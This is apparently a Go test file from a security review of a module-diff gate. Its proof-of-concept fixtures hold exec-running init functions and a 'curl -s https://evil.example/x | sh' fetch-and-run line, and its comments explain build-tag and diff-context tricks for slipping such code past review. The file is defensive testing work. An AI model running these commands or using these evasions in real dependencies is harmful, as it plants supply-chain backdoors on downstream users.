package gomod

import (
	"slices"
	"strings"
	"testing"
)

// Round 12 PoCs (security review of 3577a27).

const r12Exec = "package p\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"id\").Run() }\n"

// P1: platformTag asks knownGOOSOrGOARCH, which tests the file name
// x_<tag>.go in a linux/amd64 context. go/build cuts a file name at its
// first '.', so x_arm64.v9.0.go is "x_arm64" and excluded on amd64:
// arm64.v9.0 (GOARM64=v9.0), arm.7 (GOARM=6 drops it), ppc64.power9,
// riscv64.rva22u64, 386.sse2 ... all count as platform tags. Only amd64.vN
// is caught (the context is amd64). A plan9-only (dormant)
// exec init changed to "plan9 || arm64.v9.0" keeps its credit; an arm64
// consumer with GOARM64=v9.0 newly builds and runs it.
func TestR12ArchLevelIsConsumerVariable(t *testing.T) {
	for _, tc := range []struct{ old, new string }{
		{"plan9", "plan9 || arm64.v9.0"},      // GOARM64=v9.0
		{"plan9", "plan9 || (arm && !arm.7)"}, // GOARM=6
		{"plan9", "plan9 || ppc64le.power9"},  // GOPPC64=power9
		{"plan9", "plan9 || foo_windows"},     // -tags foo_windows: "_" split
		{"plan9", "plan9 || windows.x"},       // -tags windows.x: "." cut
		{"plan9", "plan9 || purego"},          // control: flagged
	} {
		o := writeTree(t, map[string]string{"q.go": "package p\n", "e.go": "//go:build " + tc.old + "\n\n" + r12Exec})
		c := writeTree(t, map[string]string{"q.go": "package p\n", "e.go": "//go:build " + tc.new + "\n\n" + r12Exec})
		h := CheckTrees(o, c)
		if !slices.Contains(h.items(codeInit), "e.go") {
			t.Errorf("%s -> %s: old exec init credited (consumer-variable tag treated as platform): codes %q", tc.old, tc.new, h.codes())
		}
	}
}

// P2: possiblyBuilt can only ADD tags (BuildTags). A tag that is on by
// default and that a consumer can turn off is never searched off: go1.27
// (an older toolchain), a default GOEXPERIMENT (GOEXPERIMENT=nogreenteagc),
// arm.7 (GOARM=6). A file under "!go1.27" is built nowhere and "not
// possibly built", so embeds() skips it (embed.go:142) and go list never
// builds it: the testdata binary it embeds is never flagged. A Go 1.26
// consumer builds e.go and embeds the ELF. Main sent every new //go:embed
// directive to a person.
func TestR12NegatedDefaultTagEmbedder(t *testing.T) {
	for _, tag := range []string{"!go1.27", "!goexperiment.greenteagc", "arm && !arm.7"} {
		emb := "//go:build " + tag + "\n\npackage p\n\nimport (\n\t_ \"embed\"\n\n\t\"example.com/m/internal/run\"\n)\n\n//go:embed testdata/tool.bin\nvar tool []byte\n\nfunc Start() { run.Bytes(tool) }\n"
		o := writeTree(t, map[string]string{"q.go": "package p\n", "internal/run/run.go": "package run\n\nfunc Bytes(b []byte) {}\n"})
		c := writeTree(t, map[string]string{"q.go": "package p\n", "internal/run/run.go": "package run\n\nfunc Bytes(b []byte) {}\n",
			"e.go": emb, "testdata/tool.bin": r9Payload})
		h := CheckTrees(o, c)
		t.Logf("%s: codes %v flagged %v", tag, h.codes(), h.flagged("m"))
		wantPerson(t, h, "testdata/tool.bin")
	}
}

// P3: a newly built file is "checked as new" for flagged constructs only.
// Its body is quoted nowhere: the module diff shows only the dropped
// //go:build ignore line with 3 lines of context. b.go (pre-staged, built
// by no one) calls an in-module helper, so it has no risky import, no
// init: zero items. The Hook body that consumers now run is never shown.
func TestR12NewlyBuiltBodyUnshown(t *testing.T) {
	run := "package run\n\nimport \"os/exec\"\n\nfunc Sh(s string) { exec.Command(\"sh\", \"-c\", s).Run() }\n"
	body := "package p\n\nimport \"example.com/m/internal/run\"\n\n// Hook is called by Serve.\n//\n// (padding so the diff context ends here)\n//\n//\nfunc Hook() string {\n\trun.Sh(\"curl -s https://evil.example/x | sh\")\n\treturn \"ok\"\n}\n"
	a := "package p\n\nfunc Hook() string { return \"ok\" }\n"
	o := writeTree(t, map[string]string{"internal/run/run.go": run, "a.go": a, "b.go": "//go:build ignore\n\n" + body, "s.go": "package p\n\nfunc Serve() string { return Hook() }\n"})
	c := writeTree(t, map[string]string{"internal/run/run.go": run, "a.go": "//go:build ignore\n\n" + a, "b.go": body, "s.go": "package p\n\nfunc Serve() string { return Hook() }\n"})
	h := CheckTrees(o, c)
	t.Logf("codes %v flagged %v", h.codes(), h.flagged("m"))
	if !strings.Contains(string(h.render("m")), "evil.example") {
		t.Errorf("newly built b.go's body is in no evidence the gate writes (codes %q)", h.codes())
	}
}

// TestR12SiblingUnderUserTag (round 16 scan MEDIUM): e.go (//go:build foo,
// exec init) is byte-identical; under -tags foo the old directory held two
// packages (s.go said package q), and the fixed sibling makes e.go build
// there. The search looks at e.go alone, so the gate credits nothing and
// quotes e.go in full.
func TestR12SiblingUnderUserTag(t *testing.T) {
	e := "//go:build foo\n\npackage p\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"id\").Run() }\n"
	o := writeTree(t, map[string]string{"q.go": "package p\n", "e.go": e, "s.go": "//go:build foo\n\npackage q\n"})
	c := writeTree(t, map[string]string{"q.go": "package p\n", "e.go": e, "s.go": "//go:build foo\n\npackage p\n"})
	h := CheckTrees(o, c)
	if !slices.Contains(h.items(codeInit), "e.go") || !slices.Contains(h.items(codeNewlyBuilt), "e.go") {
		t.Errorf("identical user-tagged e.go credited after a sibling changed: codes %q", h.codes())
	}
	// Nothing else in the directory changed: credited.
	c = writeTree(t, map[string]string{"q.go": "package p\n", "e.go": e, "s.go": "//go:build foo\n\npackage q\n", "other/x.go": "package other\n"})
	if h := CheckTrees(o, c); len(h.items(codeInit)) != 0 {
		t.Errorf("identical e.go with no sibling change not credited: codes %q", h.codes())
	}
}

// TestR12NewlyBuiltQuotedWhenIdentical (round 16 P3): the file a fixed
// sibling package clause brings into the build is not in the module diff;
// its text is quoted under gomod.newly-built.
func TestR12NewlyBuiltQuotedWhenIdentical(t *testing.T) {
	e := "package p\n\nfunc Hook() string { return \"curl -s https://evil.example/x | sh\" }\n"
	h := CheckTrees(writeTree(t, map[string]string{"e.go": e, "s.go": "package q\n"}), writeTree(t, map[string]string{"e.go": e, "s.go": "package p\n"}))
	if !slices.Contains(h.items(codeNewlyBuilt), "e.go") || !strings.Contains(string(h.render("m")), "evil.example") {
		t.Errorf("identical newly built e.go not quoted: codes %q", h.codes())
	}
}
